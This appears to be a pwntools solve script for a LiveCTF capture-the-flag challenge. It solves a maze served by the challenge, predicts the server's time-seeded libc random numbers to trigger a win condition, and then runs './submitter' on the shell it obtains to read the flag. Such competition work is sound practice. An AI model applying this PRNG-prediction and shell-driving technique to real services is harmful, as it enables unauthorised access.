#!/usr/bin/env python3

from pwn import *
import sys,os,string,base64

import ctypes

libc = ctypes.CDLL("libc.so.6")  
seed = libc.time(0)
libc.srand(seed)


HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

elf_path = './challenge'
# remote_libc_path = ''

#P = ELF(elf_path)
# context(os='linux',arch='amd64')
#context.terminal = ['terminator','-x','sh','-c']
# context.terminal = ['tmux','split','-h']
# context.log_level = 'debug'

# p = process(elf_path)
p = remote(HOST, PORT)

def solve(maze_arg,x, y):
    global path, visit
    if (x < 0 or x > 29 or y < 0 or y > 29):
        return 0
    if (maze_arg[x][y] == "*"):
        return 1
    if (maze_arg[x][y] == "#"):
        return 0
    if (visit[x][y]):
        return 0
    visit[x][y] = 1
    ax = x + 1
    bx = x - 1
    ay = y + 1
    by = y - 1

    
    if (solve(maze_arg,ax, y)):
        path="s" + path
        return 1

    if (solve(maze_arg, bx, y)):
        path="n" + path
        return 1

    if (solve(maze_arg, x, ay)):
        path="e" + path
        return 1
    
    if (solve(maze_arg, x, by)):
        path="w" + path
        return 1

def find_start(maze_arg):
    for i in range(30):
        for j in range(30):
            if (maze_arg[i][j] == "@"):
                return j, i

def real_solve(maze):
    global visit,path
    visit = [[0 for _ in range(32)] for i in range(32)]
    path=""
    x,y=find_start(maze)
    solve(maze,x,y)
    return path


p.recvuntil('torment: ')        
p.sendline('a')
p.recvuntil(' magical eye above the maze.\n')
maze = p.recvuntil('                              \n',drop=True).decode().strip().split("\n")

print('-'*79)
print(maze)
print('-'*79)

path = real_solve(maze)
print(path)

rand_total = 0
for i in range(591):
    libc.rand()
for i in range(len(path)):
    libc.rand() 
while (1):
    rand_total += 1
    if libc.rand() % 1213 == 1212:
        break

for i in range(rand_total):
    p.recvuntil(b'e torment: ')
    p.sendline(b'g')


for i in path:
    p.recvuntil(b'e torment: ')
    p.sendline(i.encode())

p.recvuntil(b'Congratulations! You have solved the maze!')
p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
